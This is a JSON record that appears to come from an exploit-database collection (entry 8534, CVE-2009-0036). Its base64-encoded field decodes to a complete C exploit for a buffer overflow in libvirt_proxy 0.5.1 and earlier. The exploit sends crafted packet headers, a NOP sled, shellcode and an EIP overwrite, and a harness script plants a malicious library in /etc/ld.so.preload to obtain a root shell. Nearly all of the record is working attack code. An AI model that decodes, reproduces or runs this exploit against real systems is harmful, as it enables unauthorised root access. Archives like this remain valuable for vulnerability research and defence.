{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIGN2ZS0yMDA5LTAwMzYuYw0KICoNCiAqIGxpYnZpcnRfcHJveHkgPD0gMC41LjEgTG9jYWwgUHJpdmlsZWdlIEVzY2FsYXRpb24gRXhwbG9pdA0KICogSm9uIE9iZXJoZWlkZSA8am9uQG9iZXJoZWlkZS5vcmc+DQogKiBodHRwOi8vam9uLm9iZXJoZWlkZS5vcmcNCiAqDQogKiBJbmZvcm1hdGlvbjoNCiAqDQogKiAgIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAwOS0wMDM2DQogKg0KICogICBCdWZmZXIgb3ZlcmZsb3cgaW4gdGhlIHByb3h5UmVhZENsaWVudFNvY2tldCBmdW5jdGlvbiBpbiANCiAqICAgcHJveHkvbGlidmlydF9wcm94eS5jIGluIGxpYnZpcnRfcHJveHkgMC41LjEgbWlnaHQgYWxsb3cgbG9jYWwgdXNlcnMgdG8gDQogKiAgIGdhaW4gcHJpdmlsZWdlcyBieSBzZW5kaW5nIGEgcG9ydGlvbiBvZiB0aGUgaGVhZGVyIG9mIGEgdmlyUHJveHlQYWNrZXQgDQogKiAgIHBhY2tldCwgYW5kIHRoZW4gc2VuZGluZyB0aGUgcmVtYWluZGVyIG9mIHRoZSBwYWNrZXQgd2l0aCBjcmFmdGVkIHZhbHVlcyANCiAqICAgaW4gdGhlIGhlYWRlciwgcmVsYXRlZCB0byB1c2Ugb2YgdW5pbml0aWFsaXplZCBtZW1vcnkgaW4gYSB2YWxpZGF0aW9uIA0KICogICBjaGVjay4NCiAqICAgDQogKiBVc2FnZToNCiAqDQogKiAgIFdlJ3JlIGd1ZXNzaW5nIHRvIGhpdCBvdXIgTk9QIHNsZWQsIHNvIHRoaXMgcHJvZ3JhbSBzaG91bGQgYmUgcnVuIGluIGEgDQogKiAgIGhhcm5lc3MuICBTaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgZXhlY3V0ZSAvdG1wL3J1biBhcyByb290LCB0aGUgZm9sbG93aW5nDQogKiAgIGhhcm5lc3Mgd2lsbCBpbnNlcnQgYSBtYWxpY2lvdXMgZ2V0dWlkLnNvIHBheWxvYWQgaW4gL2V0Yy9sZC5zby5wcmVsb2FkLg0KICoNCiAqICAgIyEvYmluL3NoDQogKiAgIA0KICogICBlY2hvICJbK10gY29tcGlsaW5nIHRoZSBleHBsb2l0Ig0KICogICBnY2MgY3ZlLTIwMDktMDAzNi5jIC1vIGN2ZS0yMDA5LTAwMzYNCiAqICAgDQogKiAgIGVjaG8gIlsrXSBjcmVhdGluZyAvdG1wL2dldHVpZC5zbyINCiAqICAgZWNobyAiaW50IGdldHVpZCgpe3JldHVybiAwO30iID4gL3RtcC9nZXR1aWQuYw0KICogICBnY2MgLXNoYXJlZCAvdG1wL2dldHVpZC5jIC1vIC90bXAvZ2V0dWlkLnNvDQogKiAgIA0KICogICBlY2hvICJbK10gc2V0dGluZyB1cCAvdG1wL3J1biINCiAqICAgZWNobyAtZSAiIyEvYmluL3NoIiA+IC90bXAvcnVuDQogKiAgIGVjaG8gLWUgInRvdWNoIC90bXAvc3VjY2VzcyIgPj4gL3RtcC9ydW4NCiAqICAgZWNobyAtZSAiZWNobyBcIi90bXAvZ2V0dWlkLnNvXCIgPiAvZXRjL2xkLnNvLnByZWxvYWQiID4+IC90bXAvcnVuDQogKiAgIGNobW9kICt4IC90bXAvcnVuDQogKiAgIA0KICogICBlY2hvICJbK10gc3RhcnRpbmcgZXhwbG9pdCBsb29wIg0KICogICBpPTANCiAqICAgcm0gLWYgL3RtcC9zdWNjZXNzDQogKiAgIHdoaWxlIFsgISAtZSAiL3RtcC9zdWNjZXNzIiBdDQogKiAgIGRvDQogKiAgICAgICAgICAgaT0kKCgkaSsxKSkNCiAqICAgICAgICAgICBlY2hvICJSVU4gTlVNQkVSICRpIg0KICogICAgICAgICAgIC4vY3ZlLTIwMDktMDAzNg0KICogICBkb25lDQogKiAgIA0KICogICBlY2hvICJbK10gb3VyIGdldHVpZC5zbyBpcyBub3cgaW4gbGQuc28ucHJlbG9hZCINCiAqICAgZWNobyAiWytdIHJ1bm5pbmcgc3UgdG8gb2J0YWluIHJvb3Qgc2hlbGwiDQogKiAgIHN1DQogKg0KICogTm90ZXM6DQogKg0KICogICBUZXN0ZWQgb24gR2VudG9vIExpbnV4IDMyLWJpdCB3aXRoIEdDQyA0LjMuMy1yMiBhbmQgcmFuZG9taXplX3ZhX3NwYWNlPTEuDQogKiAgIFdlIGhhdmUgYSA0MDk2IGJ5dGUgTk9QIHNsZWQgYmVmb3JlIHNoZWxsY29kZSBhbmQgRUlQIGZvbGxvd2VkIGJ5IDEwMDAgDQogKiAgIE5PUC8zMCBieXRlIHNoZWxsY29kZSBidW5kbGVzIHVudGlsIHdlIGNhdXNlIGEgRUZBVUxUIGluIGxpYnZpcnRfcHJveHkncyANCiAqICAgcmVhZCgyKS4gIE91ciB0b3RhbCBzbGVkIGlzIHVzdWFsbHkgYXJvdW5kIDVrLTEwayBOT1BzIHNvIGl0J2xsIHRha2UgDQogKiAgIH44MDAtMTYwMCB0cmllcyBvbiBhdmVyYWdlIHRvIGhpdCBpdCBhbmQgZXhlY3V0ZSBvdXIgc2hlbGxjb2RlLiAgRWFjaCBydW4NCiAqICAgdGFrZXMgfjEgc2Vjb25kLCBzbyBleHBsb2l0YXRpb24gd2lsbCBwcm9iYWJseSB0YWtlIDEwLTIwIG1pbnV0ZXMgb24NCiAqICAgYXZlcmFnZS4NCiAqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy91bi5oPg0KDQojZGVmaW5lIFBST1hZX1BBVEggIi91c3IvbGliZXhlYy9saWJ2aXJ0X3Byb3h5Ig0KI2RlZmluZSBQUk9YWV9TT0NLRVRfUEFUSCAiL3RtcC9saXZpcnRfcHJveHlfY29ubiINCiNkZWZpbmUgUFJPWFlfUFJPVE9fVkVSU0lPTiAxDQojZGVmaW5lIFBST1hZX1BBQ0tFVF9MRU5HVEggMHhmZmZmDQoNCi8qIHNpbXBsZSBzaGVsbGNvZGUgdG8gZXhlY3V0ZSAvdG1wL3J1biAqLw0KY29uc3QgY2hhciBzaGVsbGNvZGVbXT0gDQoJIlx4MzFceGRiIg0KCSJceDhkXHg0M1x4MTciDQoJIlx4OTkiDQoJIlx4Y2RceDgwIg0KCSJceDMxXHhjOSINCgkiXHg1MSINCgkiXHg2OFx4MmZceDcyXHg3NVx4NmUiDQoJIlx4NjhceDJmXHg3NFx4NmRceDcwIg0KCSJceDhkXHg0MVx4MGIiDQoJIlx4ODlceGUzIg0KCSJceGNkXHg4MCI7DQoNCnN0cnVjdCBwcm94eV9wYWNrZXQgew0KCXVpbnQxNl90IHZlcnNpb247DQoJdWludDE2X3QgY29tbWFuZDsNCgl1aW50MTZfdCBzZXJpYWw7DQoJdWludDE2X3QgbGVuOw0KfTsNCg0KaW50DQptYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCglGSUxFICpmcDsNCglsb25nIHB0cjsNCglpbnQgaSwgZmQsIHBpZCwgcmV0Ow0KICAgICAgICBjaGFyICpwa3QsIG5vcFs2NTUzNl07DQoJc3RydWN0IHNvY2thZGRyX3VuIGFkZHI7DQoJc3RydWN0IHByb3h5X3BhY2tldCByZXE7DQoJc3RydWN0IHRpbWV2YWwgdHY7DQoNCglzaWduYWwoU0lHUElQRSwgU0lHX0lHTik7DQoNCgkvKiBndWVzcyBhIHJhbmRvbSBvZmZzZXQgdG8gam1wIHRvICovDQoJZ2V0dGltZW9mZGF5KCZ0diwgTlVMTCk7DQoJc3JhbmQoKHR2LnR2X3NlYyBeIHR2LnR2X3VzZWMpIF4gZ2V0cGlkKCkpOw0KCXB0ciA9IDB4YmYwMDAwMDAgKyAocmFuZCgpICYgMHgwMGZmZmZmZik7DQoNCgkvKiBmaXJlIHVwIHRoZSBzZXR1aWQgbGlidmlydF9wcm94eSAqLw0KCXBpZCA9IGZvcmsoKTsNCglpZiAocGlkID09IDApIHsNCgkJZXhlY2woUFJPWFlfUEFUSCwgImxpYnZpcnRfcHJveHkiLCBOVUxMKTsNCgl9DQoNCgltZW1zZXQobm9wLCAnXHg5MCcsIHNpemVvZihub3ApKTsNCg0KCS8qIGNvbm5lY3QgdG8gbGlidmlydF9wcm94eSdzIEFGX1VOSVggc29ja2V0ICovDQoJZmQgPSBzb2NrZXQoUEZfVU5JWCwgU09DS19TVFJFQU0sIDApOw0KCWlmIChmZCA8IDApIHsNCgkJcHJpbnRmKCJbLV0gZmFpbGVkIHRvIGNyZWF0ZSB1bml4IHNvY2tldFxuIik7DQoJCXJldHVybiAxOw0KCX0NCg0KCW1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKGFkZHIpKTsNCglhZGRyLnN1bl9mYW1pbHkgPSBBRl9VTklYOw0KCWFkZHIuc3VuX3BhdGhbMF0gPSAnXDAnOw0KCXN0cm5jcHkoJmFkZHIuc3VuX3BhdGhbMV0sIFBST1hZX1NPQ0tFVF9QQVRILCBzdHJsZW4oUFJPWFlfU09DS0VUX1BBVEgpKTsNCg0KCXByaW50ZigiWytdIGNvbm5lY3RpbmcgdG8gbGlidmlydF9wcm94eVxuIik7DQoNCglpZiAoY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmYWRkciwgc2l6ZW9mKGFkZHIpKSA8IDApIHsNCgkJcHJpbnRmKCJbLV0gY2FudCBjb25uZWN0IHRvIGxpYnZpcnRfcHJveHkgc29ja2V0XG4iKTsNCgkJcmV0dXJuIDE7DQoJfQ0KDQoJLyogdHJhbnNtaXQgbWFsaWNpb3VzIHBheWxvYWQgdG8gbGlidmlydF9wcm94eSAqLw0KCXBrdCA9IChjaGFyICopICZyZXE7DQoJbWVtc2V0KCZyZXEsIDAsIHNpemVvZihyZXEpKTsNCglyZXEudmVyc2lvbiA9IFBST1hZX1BST1RPX1ZFUlNJT047DQoJcmVxLmxlbiA9IFBST1hZX1BBQ0tFVF9MRU5HVEg7DQoNCglwcmludGYoIlsrXSBzZW5kaW5nIGluaXRpYWwgcGFja2V0IGhlYWRlclxuIik7DQoJc2VuZChmZCwgcGt0LCA3LCAwKTsNCg0KCXVzbGVlcCgxMDAwMDApOw0KDQoJcHJpbnRmKCJbK10gc2VuZGluZyBjb3JydXB0ZWQgbGVuZ3RoIHZhbHVlXG4iKTsNCglzZW5kKGZkLCBwa3QgKyA3LCAxLCAwKTsNCg0KCXByaW50ZigiWytdIHNlbmRpbmcgcHJpbWFyeSBOT1Agc2xlZFxuIik7DQoJc2VuZChmZCwgbm9wLCA0MDk2LCAwKTsNCg0KCXByaW50ZigiWytdIHNlbmRpbmcgcHJpbWFyeSBzaGVsbGNvZGVcbiIpOw0KCXNlbmQoZmQsIHNoZWxsY29kZSwgMjgsIDApOw0KDQoJcHJpbnRmKCJbK10gc2VuZGluZyBFSVAgb3ZlcndyaXRlICgweCVseClcbiIsIHB0cik7DQoJc2VuZChmZCwgJnB0ciwgNCwgMCk7DQoNCgl1c2xlZXAoMTAwMDAwKTsNCg0KCXByaW50ZigiWytdIHNlbmRpbmcgc2Vjb25kYXJ5IE5PUC9zaGVsbGNvZGUgYnVuZGxlc1xuIik7DQoJZm9yIChpID0gMDsgaSA8IDEwMDsgKytpKSB7DQoJCXNlbmQoZmQsIG5vcCwgMTAwMCwgMCk7DQoJCXNlbmQoZmQsIHNoZWxsY29kZSwgMjgsIDApOw0KCX0NCgljbG9zZShmZCk7DQoNCgl1c2xlZXAoODAwMDAwKTsNCg0KCS8qIGNsZWFuIHNsYXRlIGlmIG91ciBndWVzc2VkIGFkZHIgZmFpbGVkICovDQoJa2lsbChwaWQsIFNJR0tJTEwpOw0KDQoJcmV0dXJuIDA7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA5LTA0LTI3XQ==", 
    "filename": "platforms/linux/local/8534.c", 
    "id": "8534", 
    "cves": [
        "CVE-2009-0036"
    ]
}